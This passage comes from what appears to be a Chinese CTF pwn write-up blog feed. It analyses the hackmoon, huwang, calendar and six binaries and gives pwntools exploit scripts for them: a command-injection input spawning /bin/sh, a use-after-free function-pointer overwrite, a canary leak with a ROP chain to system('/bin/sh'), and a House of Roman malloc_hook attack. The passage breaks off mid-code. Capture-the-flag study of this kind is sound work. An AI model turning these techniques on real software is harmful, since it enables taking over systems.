&apos;)</span><br><span class="line">sh.sendline(&apos;Create&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input Filename: &apos;)</span><br><span class="line">sh.sendline(&apos;aaaaa&apos;)</span><br><span class="line"></span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Edit&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input File Content: &apos;)</span><br><span class="line">sh.sendline(&apos;&quot;; /bin/sh ; &quot;&apos;)</span><br><span class="line"></span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Checksec&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="hackmoon"><a href="#hackmoon" class="headerlink" title="hackmoon"></a>hackmoon</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>标准的选项题，有add print delete 功能</p><p>add 限制五次分配chunk，会先分配八个字节，分配用来存放一个print_moon_content函数指针及之后为用户分配的chunk指针，同时会在bss段存放为用户分配的chunk指针。<br>print 会检查输入的idx及bss段的指针，在指针存在的情况下，调用该指针处的函数，也就是之前存放的print_moon_content函数指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl print_moon_content(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  return puts(*(const char **)(a1 + 4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete 会将之前的两个指针依次free，但是其他的什么也没动，存在UAF问题</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>UAF漏洞很明显，同时指针被放到了堆中，很容易想到利用UAF控制指针即可，又同时，题中给了magic函数，所以想办法让magic函数指针覆盖某个chunk的指针就可以了</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./hackmoon&apos;)</span><br><span class="line">elf = ELF(&apos;./hackmoon&apos;)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;moon size :&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;Content :&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(index, ):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&apos;Success\n&apos;)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">magic= 0x8048986</span><br><span class="line">add(0x8,&apos;aaaaaaa&apos;)</span><br><span class="line">add(0x8,&apos;bbbbbbb&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0x20,&apos;ccccccccc&apos;)</span><br><span class="line">add(0x8,&apos;deadbeef&apos;)</span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x8,p32(magic)*2)</span><br><span class="line">show(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;filesystem&quot;&gt;&lt;a href=&quot;#filesystem&quot; class=&quot;headerlink&quot; title=&quot;filesystem&quot;&gt;&lt;/a&gt;filesystem&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>护网杯pwn复现</title>
    <link href="http://siriuswhiter.tk/2019/02/15/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
    <id>http://siriuswhiter.tk/2019/02/15/护网杯pwn复现/</id>
    <published>2019-02-15T04:42:46.000Z</published>
    <updated>2019-03-02T06:52:01.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表面是个堆题，但实际上是个栈溢出。。。</p><p>给了add delete 函数，但是没有漏洞，题目额外给了一个guess 函数，guess成功会进入secret函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn guess()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST04_4</span><br><span class="line">  __int64 v1; // [rsp+0h] [rbp-80h]</span><br><span class="line">  __int64 v2; // [rsp+0h] [rbp-80h]</span><br><span class="line">  signed int i; // [rsp+0h] [rbp-80h]</span><br><span class="line">  int v4; // [rsp+4h] [rbp-7Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int rand; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int max_cnt; // [rsp+Ch] [rbp-74h]</span><br><span class="line">  char v8; // [rsp+10h] [rbp-70h]</span><br><span class="line">  char s[32]; // [rsp+20h] [rbp-60h]</span><br><span class="line">  char s1; // [rsp+40h] [rbp-40h]</span><br><span class="line">  char name; // [rsp+60h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v12; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;please input your name&quot;);</span><br><span class="line">  read(0, &amp;name, 0x20uLL);</span><br><span class="line">  memset(s, 0, 0x10uLL);</span><br><span class="line">  puts(&quot;Do you want to guess the secret?&quot;);</span><br><span class="line">  get_str(&amp;v8, 2LL);</span><br><span class="line">  if ( v8 == &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( access(&quot;/tmp/secret&quot;, 0) == -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      HIDWORD(v1) = open(&quot;/tmp/secret&quot;, 65, 511LL);</span><br><span class="line">      fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">      read(fd, s, 0xCuLL);</span><br><span class="line">      LODWORD(v1) = 0;</span><br><span class="line">      while ( (signed int)v1 &lt;= 11 )</span><br><span class="line">      &#123;</span><br><span class="line">        s[(signed int)v1] &amp;= 1u;</span><br><span class="line">        LODWORD(v1) = v1 + 1;</span><br><span class="line">      &#125;</span><br><span class="line">      write(SHIDWORD(v1), s, 0xCuLL);</span><br><span class="line">      close(SHIDWORD(v1));</span><br><span class="line">      close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v0 = open(&quot;/tmp/secret&quot;, 0, v1);</span><br><span class="line">    read(v0, s, 0xCuLL);</span><br><span class="line">    close(v0);</span><br><span class="line">    puts(&quot;Input how many rounds do you want to encrypt the secret:&quot;);</span><br><span class="line">    max_cnt = input_0x10();</span><br><span class="line">    if ( max_cnt &gt; 10 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;What? Why do you need to encrypt so many times?&quot;);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;At least encrypt one time&quot;, s);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    HIDWORD(v2) = open(&quot;/tmp/secret&quot;, 513);</span><br><span class="line">    LODWORD(v2) = 0;</span><br><span class="line">    while ( (unsigned int)v2 &lt; max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      MD5((__int64)s, 16LL, (__int64)s);</span><br><span class="line">      LODWORD(v2) = v2 + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(SHIDWORD(v2), s, 0x10uLL);</span><br><span class="line">    close(SHIDWORD(v2));</span><br><span class="line">    puts(&quot;Try to guess the md5 of the secret&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    read(0, &amp;s1, 0x10uLL);</span><br><span class="line">    if ( !memcmp(&amp;s1, s, 0x10uLL) )</span><br><span class="line">      secret((__int64)&amp;name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v4 = open(&quot;/tmp/secret&quot;, 513, 511LL, v2);</span><br><span class="line">    rand = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">    read(rand, s, 0xCuLL);</span><br><span class="line">    for ( i = 0; i &lt;= 11; ++i )</span><br><span class="line">      s[i] &amp;= 1u;</span><br><span class="line">    write(v4, s, 0xCuLL);</span><br><span class="line">    close(v4);</span><br><span class="line">    close(rand);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;Oh!bye %s\n&quot;, &amp;name);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall secret(__int64 name)</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // ST1B_1</span><br><span class="line">  int v3; // [rsp+1Ch] [rbp-214h]</span><br><span class="line">  char occ; // [rsp+20h] [rbp-210h]</span><br><span class="line">  char s; // [rsp+120h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+228h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Congratulations, %s guessed my secret!\n&quot;, name);</span><br><span class="line">  puts(&quot;And I want to know someting about you, and introduce you to other people who guess the secret!&quot;);</span><br><span class="line">  puts(&quot;What`s your occupation?&quot;);</span><br><span class="line">  get_str(&amp;occ, 0xFFLL);</span><br><span class="line">  v3 = snprintf(</span><br><span class="line">         &amp;s,</span><br><span class="line">         0xFFuLL,</span><br><span class="line">         &quot;I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome.........&quot;</span><br><span class="line">         &quot;.................................................................................................&quot;,</span><br><span class="line">         name,</span><br><span class="line">         &amp;occ);</span><br><span class="line">  puts(&quot;Here is your introduce&quot;);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  puts(&quot;Do you want to edit you introduce by yourself[Y/N]&quot;);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v1 == &apos;Y&apos; )</span><br><span class="line">    read(0, &amp;s, v3 - 1);</span><br><span class="line">  return printf(&quot;The final presentation is as follows:%s\n&quot;, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下保护，除了PIE其他的都开了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>secret函数栈溢出，为了能够进入secret函数，需要绕过guess函数中的检查，这里便是神奇的地方了：</p><p>程序在读入随机数时会先将其清空，而之后输入加密次数时如果输入-1会使程序卡住之后超时退出，在一小段时间之内，本该被加密的文件实际上便是空的。</p><p>而此时如果再次重连程序，md5加密其实便是对0加密，这里大佬又神奇的输入HEX[00000000000000000000000000000000]的md5值并decode(‘hex’)，从而进入secret函数。</p><p>因为进入secret函数内会先输出前面输入的name，这里可以巧妙地顺便将canary输出，有了canary之后的便顺水推舟了。</p><p><em>ps： 但是感觉后面的栈布局有点奇怪，之后再看一看</em></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line"></span><br><span class="line">def six(name,rd,secret,flag=1):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; \n&apos;)</span><br><span class="line">    sh.sendline(&apos;666&apos;)</span><br><span class="line">    sh.recvuntil(&apos;name\n&apos;)</span><br><span class="line">    sh.send(name)</span><br><span class="line">    sh.recvuntil(&apos;secret?\n&apos;)</span><br><span class="line">    sh.sendline(&apos;y&apos;)</span><br><span class="line">    sh.recvuntil(&apos;secret:\n&apos;)</span><br><span class="line">    sh.sendline(str(rd))</span><br><span class="line">    if flag == 1:</span><br><span class="line">        sh.recvuntil(&apos;secret\n&apos;)</span><br><span class="line">        sh.send(secret)</span><br><span class="line"></span><br><span class="line">six(&apos;aaa&apos;,-1,&apos;bbb&apos;,0)</span><br><span class="line">sh.recvuntil(&apos;timeout~&apos;)</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">six(&apos;a&apos;*0x19,1,&apos;4ae71336e44bf9bf79d2752e234818a5&apos;.decode(&apos;hex&apos;))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;a&apos;*0x19)</span><br><span class="line">canary = u64(&apos;\x00&apos;+sh.recvn(7))</span><br><span class="line">print &apos;canary: &apos;+hex(canary)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C)     </span><br><span class="line">sh.send(shellcode)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Congratulations, &apos;)</span><br><span class="line">libc_addr = u64(sh.recvn(6) + &apos;\x00&apos; * 2) - libc.symbols[&apos;puts&apos;]</span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(next(libc.search(&apos;/bin/sh&apos;)) + libc_addr) + p64(libc_addr + libc.symbols[&apos;system&apos;])</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="calendar"><a href="#calendar" class="headerlink" title="calendar"></a>calendar</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>选项题 add edit delete ，但是没有show函数</p><p>add 最多可以控制四个chunk，申请最大size为0x68</p><p>edit 可以输入新的size，只有在新的size小于等于原先输入的size时，可以输入内容</p><p>delete 只有free，存在UAF</p><p>程序在输入字符串时的get_str函数存在off-by-one漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; (signed int)i &lt;= len; ++i )      // off by one</span><br></pre></td></tr></table></figure><p>题目提示house of roman</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>刚开始看到没有show 函数，感觉就有点无从下手，根据house of roman的提示，去看一下这种利用方法，确实是基于没有show功能的情况下的利用方法，拿这个题顺便学习一下。</p><p>查看保护,全开（丧心病狂）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>本地关闭随机化进行调试，调试成功后进行爆破就行了(玄学爆破，getshell要看命)</p><p>house of roman 利用 局部写 减少随机化的程度，从而给出爆破的可能<br>其相当于结合了fastbin attack 与 unsortedbin attack ，在没有泄露函数地址的情况下，利用unsortedbin 的首chunk的fd bk指向main_arena+88，也就是在malloc_hook附近。</p><p><em>ps: 如果是 64 位程序，通过malloc_printerr 触发 malloc ，基本可以稳定 getshell .</em></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./task_calendar&apos;)</span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,info):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line">sh.sendafter(&apos;&gt;&apos;,info)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">sh.recvuntil(&apos;input calendar name&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">add(1,0x68)</span><br><span class="line">add(2,0x68)</span><br><span class="line">add(3,0x68)</span><br><span class="line"></span><br><span class="line">#------make chunk2 free to unsorted bin----------</span><br><span class="line"></span><br><span class="line">edit(3,0x68,p64(0)*2+p64(0x90)+p64(0x51)+&apos;\n&apos;)</span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x91&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----fastbin attack-----------------------------</span><br><span class="line"></span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x71&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,1,&apos;\x70\x70&apos;)</span><br><span class="line">edit(2,1,&apos;\xfd\x1a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--fastbin[0x70]= chunk3-&gt; chunk2 -&gt;malloc_hook-13-----</span><br><span class="line">add(1,0x60)</span><br><span class="line">add(4,0x60)</span><br><span class="line">add(3,0x60)</span><br><span class="line"></span><br><span class="line"># fix fastbinY---------</span><br><span class="line">dele(4)</span><br><span class="line">edit(4,7,p64(0))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----unsorted bin attack-------------------------</span><br><span class="line"></span><br><span class="line">add(1,0x60)</span><br><span class="line">edit(1,9,p64(0)+&apos;\x00\x1b&apos;)</span><br><span class="line">add(1,0x60)</span><br><span class="line"></span><br><span class="line">#----edit malloc_hook to one_gadget--------------</span><br><span class="line"></span><br><span class="line">one_off = 0xf66f0</span><br><span class="line">edit(3,5,&apos;aaa\xa4\xd2\xaf&apos;)</span><br><span class="line"></span><br><span class="line">dele(4)</span><br><span class="line">dele(4)</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line">sh = process(&apos;./task_calendar&apos;)</span><br><span class="line">try:</span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line">except:</span><br><span class="line">print i</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="six"><a href="#six" class="headerlink" title="six"></a>six</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>一道感觉很奇怪的题目，不容易看懂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  void (__fastcall *v3)(__int64, char *); // ST08_8</span><br><span class="line">  size_t v4; // rax</span><br><span class="line">  char *v5; // rbx</span><br><span class="line">  size_t v6; // rax</span><br><span class="line">  char s; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+18h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  mmap2chunk();</span><br><span class="line">  </span><br><span class="line">  `</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 6uLL);</span><br><span class="line">  read(fd, &amp;v3, 6uLL);</span><br><span class="line">  dest = mmap((void *)(v3 &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL);       --》rwx 高地址</span><br><span class="line">  qword_202098 = (__int64)mmap((void *)(buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 0LL) + 0x500;    --》rw  低地址</span><br><span class="line">  `</span><br><span class="line"></span><br><span class="line">  v3 = (void (__fastcall *)(__int64, char *))dest;</span><br><span class="line">  memset(&amp;s, 0, 8uLL);</span><br><span class="line">  puts(&quot;Show Ne0 your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;s, 6uLL);</span><br><span class="line">  judge_shellcode((__int64)&amp;s);</span><br><span class="line">  v4 = strlen(src);</span><br><span class="line">  memcpy(dest, src, v4);</span><br><span class="line">  v5 = (char *)dest;</span><br><span class="line">  v6 = strlen(src);</span><br><span class="line">  